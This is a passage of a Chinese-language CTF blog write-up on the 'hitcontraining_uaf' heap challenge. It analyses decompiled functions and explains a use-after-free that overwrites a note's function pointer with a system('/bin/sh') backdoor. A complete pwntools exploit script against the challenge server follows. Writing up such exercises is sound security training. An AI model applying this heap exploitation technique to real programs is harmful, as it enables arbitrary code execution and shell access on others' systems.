+<h4 id="print-note-函数分析"><a href="#print-note-函数分析" class="headerlink" title="print_note()函数分析:"></a>print_note()函数分析:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">    <span class="type">int</span> count; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);                       <span class="comment">//提示要打印的note索引</span></span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4u</span>);                        <span class="comment">//读取4个字节内容</span></span><br><span class="line">    count = atoi(buf);                       <span class="comment">//字符转整数得到索引整数值</span></span><br><span class="line">    <span class="keyword">if</span> ( count &lt; <span class="number">0</span> || count &gt;= ::count )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = *((_DWORD *)&amp;notelist + count); <span class="comment">//取出notelist[count]</span></span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">        <span class="keyword">return</span> (**((<span class="type">int</span> (__cdecl ***)(_DWORD))&amp;notelist + count))(*((_DWORD *)&amp;notelist + count));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="int-cdecl-DWORD-notelist-count-DWORD-notelist-count"><a href="#int-cdecl-DWORD-notelist-count-DWORD-notelist-count" class="headerlink" title="(**((int (__cdecl ***)(_DWORD))&amp;notelist + count))(*((_DWORD *)&amp;notelist + count));"></a>(**((int (__cdecl ***)(_DWORD))&amp;notelist + count))(*((_DWORD *)&amp;notelist + count));</h5><p>((int (__cdecl ***)(_DWORD))&amp;notelist + count))：相当于<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">&amp;</font>notelist<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">[</font>count<font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">]</font></p>
+<p><font style="color:rgb(0, 0, 0);">(**(…))(<em>((_DWORD <em>)&amp;notelist + count))相当于</em></em></font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">&amp;</font><font style="color:rgb(0, 0, 0);">notelist</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">[</font><font style="color:rgb(0, 0, 0);">count</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">] &#x3D;&gt; *</font><font style="color:rgb(0, 0, 0);">notelist</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">[</font><font style="color:rgb(0, 0, 0);">count</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">] &#x3D;&gt; notelist</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">指针直到最后相当于指向了结构体指针，等价于 printf_func(notelist[dount]);</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">也就是当前  return (**((int (__cdecl ***……ORD *)&amp;notelist + count));起到了一个调用 print 的作用。</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 原逆向代码的等价写法</span><br><span class="line">void *note_ptr = notelist[count];  // 目标笔记结构体指针</span><br><span class="line"><span class="keyword">if</span> (note_ptr != NULL) &#123;</span><br><span class="line">    // 取出偏移<span class="number">0x0</span>处的打印函数指针</span><br><span class="line">    void (*print_func)(void *) = (void (*)(void *))note_ptr;</span><br><span class="line">    // 调用函数，传入结构体指针</span><br><span class="line">    print_func(note_ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p>简单来说 print_note 函数当中并没有真正能够打印的函数，而是调用了 add_note 当中的能够实现打印的 print_note_content 函数去实现该函数的打印功能。</p>
+<h4 id="magic-后门函数："><a href="#magic-后门函数：" class="headerlink" title="magic()后门函数："></a>magic()后门函数：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> magic()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">我们前面说(**(…))(<em>((_DWORD <em>)&amp;notelist + count))相当于</em></em></font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">&amp;</font><font style="color:rgb(0, 0, 0);">notelist</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">[</font><font style="color:rgb(0, 0, 0);">count</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">] &#x3D;&gt; *</font><font style="color:rgb(0, 0, 0);">notelist</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">[</font><font style="color:rgb(0, 0, 0);">count</font><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">]，那如果 nodelist[count] &#x3D; magic 函数的话，就会指向 magic 的函数地址，直接调用这个函数。</font></p>
+<p><font style="color:rgb(0, 0, 0);background-color:rgba(0, 0, 0, 0);">具体思路大概就是这样，不过问题是我们的堆块中是这样的结构：</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">note_ptr →  0xXXXX0000（结构体起始地址）</span><br><span class="line">            0xXXXX0000：函数指针  (偏移<span class="number">0x0</span>)指向内容指针意图在与打印内容指针指向的内容</span><br><span class="line">            0xXXXX0004：内容指针  (偏移<span class="number">0x4</span>) </span><br></pre></td></tr></table></figure>
+
+<p>函数指针会调用内容指针，内容指针会去相应的地址寻找内容</p>
+<p><font style="color:#DF2A3F;">（这里再解释一下）：内容地址存放的并不是真正的内容，真正的内容在另一个可写的空间，内容地址存放的是可写空间的地址，从而跳转到可写空间去输出内容，就像这样：</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">结构体堆块 <span class="number">0x1000</span>：</span><br><span class="line">├─ <span class="number">0x1000</span>: print_note_content （函数指针，正常）</span><br><span class="line">└─ <span class="number">0x1004</span>: <span class="number">0x2000</span> （内容堆块地址）</span><br><span class="line"></span><br><span class="line">内容堆块   <span class="number">0x2000</span>：</span><br><span class="line">└─ <span class="number">0x2000</span>: aaaa （只是数据，改不到函数指针）</span><br></pre></td></tr></table></figure>
+
+<p>造成的主要问题就是，无论我们输入什么都会先调用 printf，之后再寻找地址去打印输入的内容。那么我们就需要利用主要的漏洞 uaf 去利用悬空指针修改堆内容：</p>
+<h4 id="具体思路："><a href="#具体思路：" class="headerlink" title="具体思路："></a>具体思路：</h4><p>我们可以先创建两个堆块然后删除掉，由于 free 后没有置 0，该地址依旧存在悬空指针，再次 add 的时候就可以绕过  if ( !count )  ，由于 fastbin 特性就可以直接往复用堆中存入东西，当我们存入的是 magic 时，再次调用 print_note 函数就会直接调用 magic 函数实现 system(‘&#x2F;bin&#x2F;sh’);</p>
+<h5 id="两次-add-note-函数创建四个堆块"><a href="#两次-add-note-函数创建四个堆块" class="headerlink" title="两次 add_note 函数创建四个堆块"></a>两次 add_note 函数创建四个堆块</h5><p>第一次addnote(b’16’,b’aaaa’)分别创建了一个结构体堆块 chunk1(8u)和一个内容堆块 chunk2(16u)</p>
+<p>同样的第二次addnote(b’16’,b’aaaa’)分别创建了一个结构体堆块 chunk3(8u)和一个内容堆块 chunk4(16u)</p>
+<h5 id="两次-del-note-函数删除并-free-四个堆块"><a href="#两次-del-note-函数删除并-free-四个堆块" class="headerlink" title="两次 del_note 函数删除并 free 四个堆块"></a>两次 del_note 函数删除并 free 四个堆块</h5><p>第一次和第二次 free 后的堆块链表：8u 内存链表： chunk1(8u)  -&gt; chunk3(8u)</p>
+<h5 id="第三次-add-note-b’8’-p32-magic-创建两个堆块"><a href="#第三次-add-note-b’8’-p32-magic-创建两个堆块" class="headerlink" title="第三次 add_note(b’8’,p32(magic))创建两个堆块"></a>第三次 add_note(b’8’,p32(magic))创建两个堆块</h5><p>add_note(b’8’,p32(magic))先创建一个 8u 的结构体，取chunk1(8u)的内存空间写入，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk3   →  0xXXXX0000（结构体起始地址）</span><br><span class="line">            0xXXXX0000：函数指针  (chunk1)</span><br><span class="line">            0xXXXX0004：内容指针  (偏移<span class="number">0x4</span>)此时还没有输入内容</span><br></pre></td></tr></table></figure>
+
+<p>之后创建一个 8u 的空间写内容，取 chunk3(8u)的内存空间写入。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chunk3   →  0xXXXX0000（结构体起始地址）</span><br><span class="line">            0xXXXX0000：函数指针  (chunk3)</span><br><span class="line">            0xXXXX0004：内容指针  (chunk1)--&gt;指向p32(magic)地址</span><br><span class="line"></span><br><span class="line">chunk1</span><br></pre></td></tr></table></figure>
+
+<p>上面地址是瞎写的，chunk1 和 chunk3 地址肯定是不一样的，随便表示一下</p>
+<h5 id="调用printnote-b’0’"><a href="#调用printnote-b’0’" class="headerlink" title="调用printnote(b’0’)"></a>调用printnote(b’0’)</h5><p>再调用printnote(b’0’)就会造成执行 p32(magic)的地址，从而获取 shell 了。</p>
+<hr>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn39&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn39&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25752</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size = <span class="string">b&#x27;16&#x27;</span>,content = <span class="string">b&#x27;A&#x27;</span>*<span class="number">16</span></span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendafter(<span class="string">b&#x27;Note size :&#x27;</span>,size)</span><br><span class="line">	p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendafter(<span class="string">b&#x27;Index :&#x27;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendafter(<span class="string">b&#x27;Index :&#x27;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">m_exit</span>():</span><br><span class="line">	p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addnote()</span><br><span class="line">addnote()</span><br><span class="line"></span><br><span class="line">delnote(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delnote(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048945</span></span><br><span class="line"></span><br><span class="line">addnote(size=<span class="string">b&#x27;8&#x27;</span>,content=p32(magic))</span><br><span class="line"></span><br><span class="line">printnote(index=<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<blockquote>
+<p>更新: 2026-03-01 13:39:56<br>原文: <a target="_blank" rel="noopener" href="https://www.yuque.com/idcm/wnemg9/uuaw2b69q1udv5uk">https://www.yuque.com/idcm/wnemg9/uuaw2b69q1udv5uk</a></p>
+</blockquote>
+
+    </div>
+    <footer class="article-footer">
+      
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="Unlink例题分析" class="lazyload">
+        <a href="/HFTTC.github.io/2026/04/28/Unlink%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90/" aria-label="前一篇: Unlink例题分析" title="前一篇: Unlink例题分析"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+            Unlink例题分析
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/HFTTC.github.io/images/banner.webp" data-sizes="auto" alt="[CISCN2021初赛]lonelywolf" class="lazyload">
+      <a href="/HFTTC.github.io/2026/04/28/%5BCISCN2021%E5%88%9D%E8%B5%9B%5Dlonelywolf/" aria-label="后一篇: [CISCN2021初赛]lonelywolf"  title="后一篇: [CISCN2021初赛]lonelywolf"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          [CISCN2021初赛]lonelywolf
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      SEZUVEM=
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        292.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        24:34
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Use-After-Free-%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">Use After Free 例题分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hitcontraining-uaf"><span class="toc-number">1.1.</span> <span class="toc-text">hitcontraining_uaf</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">main 函数分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add-node-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">add_node()函数分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E-add-note-%E5%87%BD%E6%95%B0%E5%BD%93%E4%B8%AD%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">对于 add_note()函数当中的结构体分析：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#del-node-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">del_node()函数分析：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#print-note-%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-number">1.1.4.</span> <span class="toc-text">print_note()函数分析:</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#int-cdecl-DWORD-notelist-count-DWORD-notelist-count"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">(**((int (__cdecl ***)(_DWORD))&amp;notelist + count))(*((_DWORD *)&amp;notelist + count));</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#magic-%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.1.5.</span> <span class="toc-text">magic()后门函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.1.6.</span> <span class="toc-text">具体思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%A4%E6%AC%A1-add-note-%E5%87%BD%E6%95%B0%E5%88%9B%E5%BB%BA%E5%9B%9B%E4%B8%AA%E5%A0%86%E5%9D%97"><span class="toc-number">1.1.6.1.</span> <span class="toc-text">两次 add_note 函数创建四个堆块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%A4%E6%AC%A1-del-note-%E5%87%BD%E6%95%B0%E5%88%A0%E9%99%A4%E5%B9%B6-free-%E5%9B%9B%E4%B8%AA%E5%A0%86%E5%9D%97"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">两次 del_note 函数删除并 free 四个堆块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AC%A1-add-note-b%E2%80%998%E2%80%99-p32-magic-%E5%88%9B%E5%BB%BA%E4%B8%A4%E4%B8%AA%E5%A0%86%E5%9D%97"><span class="toc-number">1.1.6.3.</span> <span class="toc-text">第三次 add_note(b’8’,p32(magic))创建两个堆块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E7%94%A8printnote-b%E2%80%990%E2%80%99"><span class="toc-number">1.1.6.4.</span> <span class="toc-text">调用printnote(b’0’)</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "SEZUVEM=",
+          title: "UseAfterFree例题分析",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/UseAfterFree%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90/",
+          excerpt: "",
+          description: "",
+          stripContent: "Use After Free 例题分析hitcontraining_uaf  main 函数分析123456789101112131415161718192021222324252627282930313233343536373839404142int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&amp;#123;  int n2; // eax  char buf[4]; // [esp+0h] [eb",
+          date: "Tue Apr 28 2026 19:14:15 GMT+0800",
+          updated: "Tue Apr 28 2026 19:19:30 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
